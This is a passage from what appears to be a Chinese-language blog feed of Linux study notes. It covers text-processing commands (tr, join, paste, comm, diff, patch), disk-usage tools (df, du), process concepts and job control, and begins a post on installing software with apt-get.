alt="img"></p></li><li><p>现有文件内容如下，红色方框里的内容表示区号，现在要统计出各个区号的总人数</p><p><img src="https://doc.shiyanlou.com/userid3372labid370time1420781055838" alt="img"></p><p>实现思路：首先按区号对每行信息排序，然后使用 uniq 命令对区号进行重复行统计。使用命令如下：</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sort</span> -k <span class="number">4</span>.<span class="number">1</span>n,<span class="number">4</span>.<span class="number">1</span>n student.txt | uniq -c -f <span class="number">3</span> -w <span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid370time1420781089813" alt="img"></p></li></ul><h3 id="更改字符（tr）">更改字符（tr）</h3><ul><li><p>tr 命令常被用来更改字符，我们可以把它看作是一种基于字符的查找和替换操作。换字是一种把字符从一个字母转换为另一个字母的过程，tr 可以从标准输入中替换、缩减和删除字符，并将结果写到标准输出。</p>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">tr</span> <span class="selector-attr">[option]</span> SET1 <span class="selector-attr">[SET2]</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td><code>-d</code></td><td>删除和set1匹配的字符，注意不是全词匹配也不是按字符顺序匹配</td></tr><tr><td><code>-s</code></td><td>去除set1指定的在输入文本中连续并重复的字符</td></tr></tbody></table></li><li><p>将输入的字符大写转换为小写</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;THIS IS SHIYANLOU!&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;A-Z&#x27;</span> <span class="string">&#x27;a-z&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231219125549403.png" alt="image-20231219125549403"></p></li><li><p>将输入的字符中的数字删除</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;THIS 123 IS S1HIY5ANLOU!&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;0-9&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231219125607524.png" alt="image-20231219125607524"></p></li></ul><h3 id="Tab替换空格（col）">Tab替换空格（col）</h3><ul><li><p><code>col</code>命令可以将<code>Tab</code>换成对等数量的空格键，或反转这个操作</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">col</span><span class="meta"> [option]</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td><code>-x</code></td><td>将<code>Tab</code>转换为空格</td></tr><tr><td><code>-h</code></td><td>将空格转换为<code>Tab</code>（默认选项）</td></tr></tbody></table>  <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查看<span class="regexp">/etc/</span>protocols中的不可见字符，可以看到很多^I，这其实就是Tab转义成可见字符的符号</span><br><span class="line">cat -A <span class="regexp">/etc/</span>protocols</span><br><span class="line"># 使用 col -x将<span class="regexp">/etc/</span>protocols中的Tab转换为空格,然后再使用cat查看，发现^I不见了</span><br><span class="line">cat <span class="regexp">/etc/</span>protocols | col -x | cat -A</span><br></pre></td></tr></table></figure></li></ul><h3 id="合并字段（join）">合并字段（join）</h3><ul><li><p>join将两个文件中指定栏位相同的行连接起来，即按照两个文件中共同拥有的某一列，将对应的行拼接成一行</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">join</span> [option] <span class="symbol">&lt;file1&gt;</span> <span class="symbol">&lt;file2&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td><code>-t</code></td><td>指定分隔符，默认为Tab</td></tr><tr><td><code>-i</code></td><td>忽略大小写的差异</td></tr><tr><td><code>-1</code>（数字1）</td><td>指明第一个文件要用哪个字段来对比，默认对比第一个字段</td></tr><tr><td><code>-2</code></td><td>指明第二个文件要用哪个字段来对比，默认对比第一个字段</td></tr></tbody></table></li><li><p>将两个文件中的第一个字段作为匹配字段，连接两个文件</p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">join <span class="selector-tag">a</span><span class="selector-class">.txt</span> <span class="selector-tag">b</span>.txt</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid370time1420781241207" alt="img"></p></li><li><p>指定两个文件的第三个字段为匹配字段，连接两个文件</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">join</span> -<span class="number">1</span> <span class="number">3</span> -<span class="number">2</span> <span class="number">3</span> c.txt d.txt</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/document-uid370051labid370timestamp1490930024622.png" alt="此处输入图片的描述"></p></li></ul><h3 id="简单合并文件（paste）">简单合并文件（paste）</h3><ul><li><p>paste 命令的功能正好与 cut 相反。它会添加一个或多个文本列到文件中，而不是从文件中抽取文本列。它通过读取多个文件，然后把每个文件中的字段整合成单个文本流，输入到标准输出。</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paste [<span class="keyword">option</span>] &lt;<span class="keyword">file</span>&gt;...</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-s</code></td><td>将每个文件合并成行而不是按行粘贴</td></tr><tr><td><code>-d</code></td><td>自定义分隔符，默认为制表符</td></tr></tbody></table></li><li><p>将<code>student.txt</code>和<code>telphone.txt</code>文件中的内容按列拼接</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">paste</span> student.txt telphone.txt</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid369time1420780031604" alt="img"></p></li><li><p>将<code>student.txt</code>和<code>telphone.txt</code>文件中的内容按列拼接，指定分隔符为<code>:</code></p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paste student<span class="selector-class">.txt</span> telphone<span class="selector-class">.txt</span> -d <span class="string">&#x27;:&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid369time1420780078087" alt="img"></p></li><li><p>将<code>student.txt</code>和<code>telphone.txt</code>文件中的内容各自拼接成一行</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">paste</span> -s student.txt telphone.txt</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid369time1420780124133" alt="img"></p></li></ul><h3 id="比较文本文件（comm）">比较文本文件（comm）</h3><ul><li><p>comm 命令将逐行比较已经排序的两个文件。显示结果包括 3 列：第 1 列为只在第一个文件中找到的行，第 2 列为只在第二个文件中找到的行，第 3 列为两个文件的共有行。</p>  <figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">comm [<span class="keyword">option</span>] <span class="language-xml"><span class="tag">&lt;<span class="name">file1</span>&gt;</span> </span><span class="language-xml"><span class="tag">&lt;<span class="name">file2</span>&gt;</span></span></span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-1</code>（数字1）</td><td>不输出文件 1 特有的行</td></tr><tr><td><code>-2</code></td><td>不输出文件 2 特有的行</td></tr><tr><td><code>-3</code></td><td>不输出两个文件共有的行</td></tr></tbody></table></li><li><p>比较<code>file1.txt</code>和<code>file2.txt</code>两个文件的内容</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">comm</span> file1.txt file2.txt</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid371time1420781783879" alt="img"></p></li><li><p>比较<code>file1.txt</code>和<code>file2.txt</code>两个文件的内容，只显示两个文件共有的内容</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">comm</span> -<span class="number">12</span> file1.txt file2.txt</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid371time1420781829807" alt="img"></p></li></ul><h3 id="监测文件差异（diff）">监测文件差异（diff）</h3><ul><li><p>类似 comm 命令，diff 命令被用来监测文件之间的差异。然而，diff 是一款更加复杂的工具，它支持许多输出格式，并且一次能处理许多文本文件。diff 能够递归地检查源码目录，通常称之为源码树。diff 程序的一个常见用例是创建 diff 文件或者补丁，它会被其它程序使用，例如 patch 程序，来把文件从一个版本转换为另一个版本。</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff [<span class="keyword">option</span>] &lt;<span class="keyword">file</span>&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-c</code></td><td>上下文模式，显示全部内文，并标出不同之处</td></tr><tr><td><code>-u</code></td><td>统一模式，以合并的方式来显示文件内容的不同</td></tr><tr><td><code>-a</code></td><td>只会逐行比较文本文件</td></tr><tr><td><code>-N</code></td><td>在比较目录时，若文件 A 仅出现在某个目录中，预设会显示：Only in 目录。若使用 -N 参数，则 diff 会将文件 A 与一个空白的文件比较</td></tr><tr><td><code>-r</code></td><td>递归比较目录下的文件</td></tr></tbody></table></li><li><p>显示<code>file1.txt</code>和<code>file2.txt</code>两个文件的差异</p>  <figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">diff</span> file1.txt file2.txt</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid371time1420781912223" alt="img"></p><p>上面结果显示中的“1d0”表示<code>file1.txt</code>文件比<code>file2.txt</code>文件多了第一行，“4c3,4”表示<code>file1.txt</code>文件的第四行和<code>file2.txt</code>文件的第三、四行不同。</p><blockquote><p>diff 的 normal 显示格式有三种提示:</p><ul><li>a - add</li><li>c - change</li><li>d - delete</li></ul></blockquote></li><li><p>从上面例一的显示结果可以知道，<code>file1.txt</code>和<code>file2.txt</code>两个文件的差异不易直观看出，这时可以使用上下文模式显示</p>  <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff  -<span class="keyword">c</span> file<span class="number">1</span>.txt  file<span class="number">2</span>.txt</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid371time1420781985260" alt="img"></p><blockquote><p><code>+</code> 添加行，这一行将会出现在第二个文件内，而不是第一个文件内</p><p><code>-</code> 删除行，这一行将会出现在第一个文件中，而不是第二个文件内</p><p><code>!</code> 更改行，将会显示某个文本行的两个版本，每个版本会出现在更改组的各自部分</p></blockquote></li><li><p>查看<code>file1.txt</code>和<code>file2.txt</code>两个文件的差异，使用统一模式显示</p>  <figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">diff</span> -u file1.txt file2.txt</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid371time1420782103081" alt="img"></p></li></ul><h3 id="文本中应用更改（patch）">文本中应用更改（patch）</h3><ul><li><p>patch 命令被用来把更改应用到文本文件中。它接受从 diff 程序的输出，并且通常被用来把较老的文件版本转变为较新的文件版本</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patch [<span class="keyword">option</span>] &lt;<span class="keyword">file</span>&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-p num</code></td><td>忽略几层文件夹</td></tr><tr><td><code>-E</code></td><td>如果发现了空文件，那么就删除它</td></tr><tr><td><code>-R</code></td><td>取消打过的补丁</td></tr></tbody></table></li><li><p>生成<code>file1.txt</code>和<code>file2.txt</code>的 diff 文件，然后应用 patch 命令更新<code>file1.txt</code>文件</p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">diff  -Naur file1<span class="selector-class">.txt</span>  file2<span class="selector-class">.txt</span> &gt; patchdiff<span class="selector-class">.txt</span></span><br><span class="line">patch &lt; patchdiff.txt</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid371time1420782242319" alt="img"></p></li><li><p>取消上面打过的补丁</p>  <figure class="highlight glsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">patch</span> -R &lt; patchdiff.txt</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid371time1420782287649" alt="img"></p></li></ul><h2 id="空间管理">空间管理</h2><h3 id="查看目录结构（tree）">查看目录结构（tree）</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tree</span> &lt;<span class="built_in">dir</span>&gt;</span><br></pre></td></tr></table></figure><p>安装方式：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> update</span><br><span class="line">sudo apt-<span class="built_in">get</span> install tree</span><br></pre></td></tr></table></figure><h3 id="磁盘占用情况（df）">磁盘占用情况（df）</h3><ul><li><p>df （disk free）命令的功能是用来检查 linux 服务器的文件系统的磁盘空间占用情况。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df [<span class="keyword">option</span>] &lt;<span class="keyword">file</span>&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-a</code></td><td>全部文件系统列表</td></tr><tr><td><code>-h</code></td><td>方便阅读方式显示</td></tr><tr><td><code>-i</code></td><td>显示 inode 信息</td></tr><tr><td><code>-T</code></td><td>文件系统类型</td></tr><tr><td><code>-t&lt;文件系统类型&gt;</code></td><td>只显示选定文件系统的磁盘信息</td></tr><tr><td><code>-x&lt;文件系统类型&gt;</code></td><td>不显示选定文件系统的磁盘信息</td></tr></tbody></table></li><li><p>显示磁盘使用情况</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">df</span></span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid393time1421740116614" alt="img"></p></li><li><p>以 inode 模式来显示磁盘使用情况</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">df</span> -i</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid393time1421740127431" alt="img"></p></li><li><p>列出文件系统的类型</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">df</span> -T</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid393time1421740135464" alt="img"></p></li><li><p>显示指定类型磁盘</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">df</span> -t ext4</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid393time1421740147180" alt="img"></p></li></ul><h3 id="查看使用空间（du）">查看使用空间（du）</h3><ul><li><p>du（disk usage）命令也是查看使用空间的，但是与 df 命令不同的是 Linux du 命令是对文件和目录磁盘使用的空间的查看。</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du [<span class="keyword">option</span>] &lt;<span class="keyword">file</span>&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-a</code></td><td>显示目录中所有文件的大小。</td></tr><tr><td><code>-b</code></td><td>显示目录或文件大小时，以 byte 为单位。</td></tr><tr><td><code>-c</code></td><td>除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。</td></tr><tr><td><code>-k</code></td><td>以 KB(1024bytes)为单位输出。</td></tr><tr><td><code>-m</code></td><td>以 MB 为单位输出。</td></tr><tr><td><code>-s</code></td><td>仅显示总计，只列出最后加总的值。</td></tr><tr><td><code>-h</code></td><td>以 K，M，G 为单位，提高信息的可读性。</td></tr></tbody></table></li><li><p>显示指定文件所占空间，以方便阅读的格式显示</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">du</span> -h file1.txt</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid393time1421740343106" alt="img"></p></li><li><p>显示指定目录所占空间，以方便阅读的格式显示</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">du</span> -h Desktop</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid393time1421740370569" alt="img"></p></li><li><p>显示几个文件或目录各自占用磁盘空间的大小，并且统计总和</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">du</span> -ch file1.txt file2.txt</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid393time1421740386138" alt="img"></p></li><li><p>按照空间大小逆序排序显示</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">du</span> -h | <span class="built_in">sort</span> -nr | <span class="built_in">head</span> -10</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid393time1421740400752" alt="img"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 学期总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux中的进程</title>
      <link href="/posts/62cfef17.html"/>
      <url>/posts/62cfef17.html</url>
      
        <content type="html"><![CDATA[<h2 id="程序与进程">程序与进程</h2><ul><li><p>简单地说，程序就是为了完成某种任务而设计的软件，进程就是运行中的程序。</p></li><li><p>程序只是一些列指令的集合，是一个静止的实体，而进程则有以下特性：</p><ul><li>动态性：进程的实质是一次程序执行的过程，有创建、撤销等状态的变化。而程序是一个静态的实体。</li><li>并发性：进程可以做到在一个时间段内，有多个程序在运行中。程序只是静态的实体，所以不存在并发性。</li><li>独立性：进程可以独立分配资源，独立接受调度，独立地运行。</li><li>异步性：进程以不可预知的速度向前推进。</li><li>结构性：进程拥有代码段、数据段、PCB（进程控制块，进程存在的唯一标志）。也正是因为有结构性，进程才可以做到独立地运行。</li></ul></li><li><p>而随着程序的发展越做越大，又会继续细分，从而引入了线程的概念，当代多数操作系统、Linux 2.6及更新的版本中，进程本身不是基本运行单位，而是线程的容器。</p><blockquote><p><strong>线程</strong>（thread）是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。因为线程中几乎不包含系统资源，所以执行更快、更有效率。</p></blockquote></li><li><p>简而言之,一个程序至少有一个进程,一个进程至少有一个线程。线程的划分尺度小于进程，使得多线程程序的并发性高。另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。</p></li></ul><h2 id="进程的属性">进程的属性</h2><h3 id="进程的分类">进程的分类</h3><h4 id="按功能和服务对象">按功能和服务对象</h4><ul><li>从这个角度看，可以将进程分为用户进程与系统进程<ul><li>用户进程：通过执行用户程序、应用程序或称之为内核之外的系统程序而产生的进程，此类进程可以在用户的控制下运行或关闭。</li><li>系统进程：通过执行系统内核程序而产生的进程，比如可以执行内存资源分配和进程切换等相对底层的工作；而且该进程的运行不受用户的干预，即使是 root 用户也不能干预系统进程的运行。</li></ul></li></ul><h4 id="按应用程序的服务类型">按应用程序的服务类型</h4><ul><li>从这个角度看，可以将进程分为交互进程、批处理进程、守护进程<ul><li>交互进程：由一个 shell 终端启动的进程，在执行过程中，需要与用户进行交互操作，可以运行于前台，也可以运行在后台。</li><li>批处理进程：该进程是一个进程集合，负责按顺序启动其他的进程。</li><li>守护进程：守护进程是一直运行的一种进程，在 Linux 系统启动时启动，在系统关闭时终止。它们独立于控制终端并且周期性的执行某种任务或等待处理某些发生的事件。</li></ul></li></ul><h3 id="进程的衍生">进程的衍生</h3><h4 id="父进程与子进程">父进程与子进程</h4><ul><li><p>子进程是由父进程开启的，比如在终端中输入<code>bash</code>再启动一个终端，那么新打开的终端则称为子进程，前者则为父进程。关于父进程与子进程便会涉及这两个系统调用 <code>fork()</code> 与 <code>exec()</code>：</p><ul><li><code>fork()</code>：主要作用是为当前的进程创建一个新的进程，这个新的进程就是它的子进程，这个子进程除了父进程的返回值和 PID 以外其他的都一模一样，如进程的执行代码段，内存信息，文件描述，寄存器状态等等</li><li><code>exec()</code>：作用是切换子进程中的执行程序，也就是替换其从父进程复制过来的代码段与数据段</li></ul></li><li><p>子进程在退出前主函数<code>main()</code>会执行<code>exit(n)</code>或者<code>return n</code>返回一个信号值，系统会把这个 SIGCHLD 信号传给其父进程，当然若是异常终止也往往是因为这个信号。</p></li></ul><h4 id="僵尸进程">僵尸进程</h4><ul><li>正常情况下，父进程会收到两个返回值：exit code（SIGCHLD 信号）与 <code>reason for termination</code> 。之后，父进程会使用 <code>wait(&amp;status)</code> 系统调用以获取子进程的退出状态，然后内核就可以从内存中释放已结束的子进程的 PCB；而如若父进程没有这么做的话，子进程的 PCB 就会一直驻留在内存中，一直留在系统中成为僵尸进程（Zombie）。</li><li>虽然僵尸进程是已经放弃了几乎所有内存空间，没有任何可执行代码，也不能被调度，在进程列表中保留一个位置，记载该进程的退出状态等信息供其父进程收集，从而释放它。但是 Linux 系统中能使用的 PID 是有限的，如果系统中存在有大量的僵尸进程，系统将会因为没有可用的 PID 从而导致不能产生新的进程。</li></ul><h4 id="孤儿进程">孤儿进程</h4><ul><li>另外如果父进程结束（非正常的结束），未能及时收回子进程，子进程仍在运行，这样的子进程称之为孤儿进程。在 Linux 系统中，孤儿进程一般会被 init 进程所“收养”，成为 init 的子进程。由 init 来做善后处理，所以它并不至于像僵尸进程那样无人问津，不管不顾，大量存在会有危害。</li></ul><h4 id="进程0（内核初始化进程）">进程0（内核初始化进程）</h4><ul><li>进程 0 是系统引导时创建的一个特殊进程，也称之为内核初始化，其最后一个动作就是调用 <code>fork()</code> 创建出一个子进程运行 <code>/sbin/init</code> 可执行文件,而该进程就是 PID=1 的进程 1，而进程 0 就转为交换进程（也被称为空闲进程），进程 1 （init 进程）是第一个用户态的进程，再由它不断调用 fork() 来创建系统里其他的进程，所以它是所有进程的父进程或者祖先进程。同时它是一个守护程序，直到计算机关机才会停止。</li></ul><h3 id="进程组与Session">进程组与Session</h3><ul><li>每一个进程都会是一个进程组的成员，而且这个进程组是唯一存在的，他们是依靠 PGID来区别的，而每当一个进程被创建的时候，它便会成为其父进程所在组中的一员。</li><li>一般情况，进程组的 PGID 等同于进程组的第一个成员的 PID，并且这样的进程称为该进程组的领导者,也就是领导进程，进程一般通过使用 <code>getpgrp()</code> 系统调用来寻找其所在组的 PGID，领导进程可以先终结，此时进程组依然存在，并持有相同的PGID，直到进程组中最后一个进程终结。</li><li>与进程组类似，每当一个进程被创建的时候，它便会成为其父进程所在 Session 中的一员，每一个进程组都会在一个 Session 中，并且这个 Session 是唯一存在的，Session 中的每个进程都称为一个工作(job)。</li></ul><h3 id="工作管理">工作管理</h3><ul><li><p>并且每个终端或者说 bash 只能管理当前终端中的 job，不能管理其他终端中的 job。</p></li><li><p>结束前台进程可以使用<kbd>Ctrl</kbd>+<kbd>C</kbd>，但无法结束后台进程。</p></li><li><p>如果使用<code>&amp;</code>符号，进程则会在后台中运行，查看运行中的进程可以使用<code>ls &amp;</code>，得到序号如<code>[1] 204</code>分别是该 job 的 job number 与该进程的 PID，而最后一行的 Done 表示该命令已经在后台执行完毕。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231201224354846.png" alt="image-20231201224354846"></p></li><li><p>如果希望暂停当前工作并存放到后台可以使用<kbd>Ctrl</kbd>+<kbd>Z</kbd></p><p><img src="https://oss.iuoyt.com/img/posts/image-20231201224613524.png" alt="image-20231201224613524"></p></li><li><p>被放置到后台的工作可以使用<code>jobs</code>查看。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231201224819667.png" alt="image-20231201224819667"></p><p>其中第一列显示的为被放置后台 job 的编号，而第二列的 <code>+</code> 表示最近(刚刚、最后)被放置后台的 job，同时也表示预设的工作，也就是若是有什么针对后台 job 的操作，首先对预设的 job，<code>-</code> 表示倒数第二（也就是在预设之前的一个）被放置后台的工作，倒数第三个（再之前的）以后都不会有这样的符号修饰，第三列表示它们的状态，而最后一列表示该进程执行的命令。</p></li><li><p>如果希望将后台的工作拿到前台继续进行，可以使用<code>fg</code>命令：</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#后面不加参数提取预设工作，加参数提取指定工作的编号</span></span><br><span class="line"><span class="comment">#ubuntu 在 zsh 中需要 %，在 bash 中不需要 %</span></span><br><span class="line"><span class="attribute">fg</span><span class="meta"> [%jobnumber]</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231201225144514.png" alt="image-20231201225144514"></p></li><li><p>而如果希望其在后台继续而不拿到前台，可以使用<code>bg</code>命令：</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#与fg类似，加参则指定，不加参则取预设</span></span><br><span class="line"><span class="attribute">bg</span><span class="meta"> [%jobnumber]</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231201225553266.png" alt="image-20231201225553266"></p></li><li><p>如果希望删除后台的工作，可以使用<code>kill</code>命令结束进程：</p>  <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#kill的使用格式如下</span></span><br><span class="line"><span class="keyword">kill</span> -signal %jobnumber</span><br><span class="line"></span><br><span class="line"><span class="comment">#signal从1-64个信号值可以选择，可以这样查看</span></span><br><span class="line"><span class="keyword">kill</span> －l</span><br></pre></td></tr></table></figure><p>其中常用的有这些信号值</p></li></ul><table><thead><tr><th>信号值</th><th>作用</th></tr></thead><tbody><tr><td>-1</td><td>重新读取参数运行，类似与restart</td></tr><tr><td>-2</td><td>如同 ctrl+c 的操作退出</td></tr><tr><td>-9</td><td>强制终止该任务</td></tr><tr><td>-15</td><td>正常的方式终止该任务</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下软件安装</title>
      <link href="/posts/cf3716a6.html"/>
      <url>/posts/cf3716a6.html</url>
      
        <content type="html"><![CDATA[<ul><li>Linux上通常有四种方式安装软件：<ul><li>在线安装</li><li>从磁盘安装deb软件包</li><li>从二进制软件包安装</li><li>从源代码编译安装</li></ul></li><li>这篇文章中使用的场景均为Ubuntu下，不一定适用于其他Linux发行版。</li></ul><h2 id="使用apt-get安装软件">使用apt-get安装软件</h2><ul><li><p>现在如果想安装一个名为<code>w3m</code>（命令行的简易网页浏览器），那么可以输入如下命令：</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install w3m</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231201175216825.png" alt="image-20231201175216825"></p></li><li><p>在软件安装完成后，无法直接使用<kbd>Tab</kbd>补全命令，可以先执行如下命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></li></ul><h3 id="apt包管理工具介绍">apt包管理工具介绍</h3><blockquote><p>APT是Advance Packaging 